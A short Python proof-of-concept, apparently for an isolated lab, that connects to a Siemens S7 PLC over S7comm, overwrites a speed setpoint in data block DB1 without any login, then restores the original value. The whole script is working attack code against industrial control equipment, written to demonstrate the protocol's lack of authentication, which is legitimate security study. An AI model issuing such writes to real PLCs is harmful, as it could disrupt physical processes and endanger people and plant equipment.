"""S7comm client — the dangerous half, Siemens edition.
Connects to a PLC and writes DB1.DBW0 (a speed setpoint, Hz x100). No credential is
offered because S7comm has no session login. Reads, writes 15.0 Hz, restores 42.0 Hz.
Own equipment / isolated lab only."""
import struct, snap7

c = snap7.client.Client()
c.connect("s7-plc", 0, 1)  # rack 0, slot 1 — as a real S7-300/400 CPU
before = struct.unpack(">H", bytes(c.db_read(1, 0, 2)))[0]
print(f"BEFORE   DB1.DBW0 = {before}  ({before/100:.1f} Hz)")
c.db_write(1, 0, struct.pack(">H", 1500))
print("WROTE    DB1.DBW0 = 1500  (15.0 Hz)   <- no login was asked")
after = struct.unpack(">H", bytes(c.db_read(1, 0, 2)))[0]
print(f"AFTER    DB1.DBW0 = {after}  ({after/100:.1f} Hz)")
c.db_write(1, 0, struct.pack(">H", 4200))
print("RESTORED DB1.DBW0 = 4200  (42.0 Hz)   (lab left as found)")
c.disconnect()
